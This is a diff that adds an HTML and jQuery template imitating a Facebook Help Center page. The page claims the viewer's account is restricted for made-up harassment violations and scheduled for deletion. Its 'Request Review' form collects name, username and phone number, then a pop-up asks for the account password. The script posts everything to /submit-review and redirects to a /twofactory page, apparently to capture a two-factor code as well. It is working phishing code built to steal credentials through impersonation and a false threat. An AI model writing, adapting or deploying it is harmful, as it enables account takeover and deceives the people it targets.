@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook</title>
+  <link rel="stylesheet" href="/static/css/style.css">
+
+  <link rel="icon" href="." type="/static/images/x-icon">
+  <link rel="shortcut icon" href="/static/images/logo.png" type="image/x-icon">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+</head>
+<body>
+    <div class="main-wrapper">
+
+      <div class="header">
+        <div class="h-left d-flex align-items-center">
+          <img src="/static/images/logo.png" alt="Facebook" width="40px" class="ms-2">
+          <p class="mb-0 fw-semibold">Help Center</p>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="row pe-0">
+          <div class="col-lg-5 col-12">
+            <div class="p-3 p-sm-5 border-right">
+              <p class="mb-0 fw-semibold title">Account Status</p>
+              
+              <div class="card mt-3">
+                <div class="d-flex align-items-center">
+                  <div class="profile-img-wrapp">
+                    <img src="{{.ProfilePhoto}}" alt="Profile">
+                  </div>
+                  <div class="d-flex flex-column justify-content-between ms-4">
+                    <p class="mb-0 fw-semibold">{{.ProfileName}}!</p>
+                    <p class="mb-0 text-danger">Account Restricted</p>
+                    <p class="mb-0">Your account has been scheduled for deletion</p>
+                  </div>
+                </div>
+              </div>
+
+              <div class="card mt-3">
+                <div class="">
+                  <p class="mb-0 fw-semibold title">Violations</p>
+                  <div class="d-flex flex-column">
+
+                    <div class="row mt-3">
+                      <div class="d-flex align-items-center">
+                        <div class="violations-icon">
+                          <img src="/static/images/icons/message.svg" alt="Message" width="60">
+                        </div>
+                        <div class="d-flex flex-column ms-3">
+                          <p class="mb-0 fw-semibold violation-message">Link you shared didn't follow our Community Standards on harassment and bullying</p>
+                          <p class="mb-0 violation-date">Dec 28th 2023 - Open</p>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="row mt-3">
+                      <div class="d-flex align-items-center">
+                        <div class="violations-icon">
+                          <img src="/static/images/icons/message.svg" alt="Message" width="60">
+                        </div>
+                        <div class="d-flex flex-column ms-3">
+                          <p class="mb-0 fw-semibold violation-message">Link you shared didn't follow our Community Standards on harassment and bullying</p>
+                          <p class="mb-0 violation-date">Dec 28th 2023 - Open</p>
+                        </div>
+                      </div>
+                    </div>
+                    
+                    <div class="row mt-3">
+                      <div class="d-flex align-items-center">
+                        <div class="violations-icon">
+                          <img src="/static/images/icons/message.svg" alt="Message" width="60">
+                        </div>
+                        <div class="d-flex flex-column ms-3">
+                          <p class="mb-0 fw-semibold violation-message">Link you shared didn't follow our Community Standards on harassment and bullying</p>
+                          <p class="mb-0 violation-date">Dec 28th 2023 - Open</p>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="row mt-3">
+                      <div class="d-flex align-items-center">
+                        <div class="violations-icon">
+                          <img src="/static/images/icons/message.svg" alt="Message" width="60">
+                        </div>
+                        <div class="d-flex flex-column ms-3">
+                          <p class="mb-0 fw-semibold violation-message">Link you shared didn't follow our Community Standards on harassment and bullying</p>
+                          <p class="mb-0 violation-date">Dec 28th 2023 - Open</p>
+                        </div>
+                      </div>
+                    </div>
+
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          
+          <div class="col-lg-7 col-12">
+            <div class="p-3 p-sm-5 border-left">
+              <p class="mb-0 fw-semibold title">Request Review</p>
+
+              <div class="card mt-3">
+                <div class="mt-3">
+                  <p class="fw-semibold title">Request Review</p>
+                  <form action="/submit-review" method="post" id="reviewForm">
+                    <div class="alert-danger">
+                      <img src="/static/images/icons/warning.svg" alt="Warning" width="22">
+                      <p class="mb-0 mt-2 fw-semibold">Request a review to cancel account deletion!</p>
+                      <p class="mb-0">When requesting a review, your account will be put on reviewing state, which means it won't be deleted until a decision is made by our support team for which we will notify you via email.</p>
+                    </div>
+              
+                    <div class="mt-3">
+                      <p class="fw-semibold">Full name</p>
+                      <input class="form-control" type="text" name="fullname" id="fullname" required>
+                    </div>
+              
+                    <div class="mt-3">
+                      <p class="fw-semibold">Username</p>
+                      <input class="form-control" type="text" name="username" id="username" required>
+                    </div>
+              
+                    <div class="mt-3">
+                      <p class="fw-semibold">Phone number</p>
+                      <input class="form-control" type="number" name="phone" id="phone" required title="You need to fill in this field">
+                    </div>
+              
+                    <div class="mt-3">
+                      <p class="fw-semibold">Description</p>
+                      <textarea class="form-control" name="description" id="description" rows="4" cols="50"></textarea>
+                    </div>
+              
+                    <div class="mt-3">
+                      <button type="submit" class="btn btn-primary" id="submitButton">Submit</button> <!-- Updated submit button -->
+                    </div>
+     
+                  </form>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+          <div class="modal-content">
+            <div class="modal-body">
+              <div class="d-flex justify-content-end">
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+              </div>
+              <div class="d-flex flex-column align-items-center p-2">
+                <div class="login-profile-wrapp">
+                  <img src="{{.ProfilePhoto}}" alt="" width="100%">
+                </div>
+                <input class="form-control mt-4" type="password" placeholder="Password" name="password" id="modalPassword">
+                <button type="button" class="btn btn-primary form-control mt-3" id="modalContinueButton">Continue</button>
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+     
+
+
+
+
+<div class="footer">
+  <div class="footer-container">
+    <p class="mb-1">
+      <a class="active">English (US)</a>&nbsp;&nbsp;&nbsp;
+      <a href="#">Shqip</a>&nbsp;&nbsp;&nbsp;
+      <a href="#">Deutsch</a>&nbsp;&nbsp;&nbsp;
+      <a href="#">Türkçe</a>&nbsp;&nbsp;&nbsp;
+      <a href="#">Српски</a>&nbsp;&nbsp;&nbsp;
+      <a href="#">Français (France)</a>&nbsp;&nbsp;&nbsp;
+      <a href="#">Italiano</a>&nbsp;&nbsp;&nbsp;
+      <a href="#">Bosanski</a>&nbsp;&nbsp;&nbsp;
+      <a href="#">Svenska</a>&nbsp;&nbsp;&nbsp;
+      <a href="#">Español</a>&nbsp;&nbsp;&nbsp;
+      <a href="#">Português (Brasil)</a>&nbsp;&nbsp;&nbsp;
+    </p>
+  <hr class="mb-1 mt-0"/>
+  <p>
+      <a href="#">Sign Up</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Log In</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Messenger</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Facebook Lite</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Video</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Places</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Games</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Marketplace</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Meta Pay</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Meta Store</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Meta Quest</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Instagram</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Threads</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Fundraisers</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Services</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Voting Information Center</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Privacy Policy</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Privacy Center</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Groups</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">About</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Create ad</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Create Page</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Developers</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Careers</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Cookies</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Ad choices</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Terms</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Help</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Contact</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Uploading & Non-Users</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Settings</a>&nbsp;&nbsp;&nbsp; 
+      <a href="#">Activity log</a>
+  </p>
+  <p class="meta">Meta © 2024</p>
+  </div>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+$(document).ready(function () {
+    // Function to show the modal
+    function showModal() {
+      $('#staticBackdrop').modal('show');
+    }
+
+    // Function to handle form submission
+    function submitForm(password) {
+      // Get form data
+      var formData = $('#reviewForm').serialize();
+      formData += '&password=' + encodeURIComponent(password);
+
+      // Simulate sending form data to "/submit-review"
+      $.ajax({
+        type: 'POST', // Use 'POST' if your endpoint expects POST requests
+        url: '/submit-review',
+        data: formData,
+        success: function (response) {
+          // Handle the success response
+          console.log('Form submission successful:', response);
+
+          window.location.href = '/twofactory';
+
+          // You can redirect the user or perform any other action here
+        },
+        error: function (error) {
+          // Handle the error response
+          console.error('Form submission failed:', error);
+
+          // You can show an error message or perform other error-handling actions
+        }
+      });
+
+      // Close the modal
+      $('#staticBackdrop').modal('hide');
+    }
+
+    // Event listener for the form submission
+    $('#submitButton').on('click', function (e) {
+      e.preventDefault(); // Prevent the default form submission
+
+      // Show the modal when the submit button is clicked
+      showModal();
+    });
+
+    // Event listener for the modal continue button
+    $('#modalContinueButton').on('click', function () {
+      // Get the password from the modal input
+      var password = $('#modalPassword').val();
+
+      // You can add additional validation for the password here
+      // For now, let's assume the password is valid
+
+      // Submit the form after entering the password
+      submitForm(password);
+    });
+  });
+</script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+</body>
+</html>
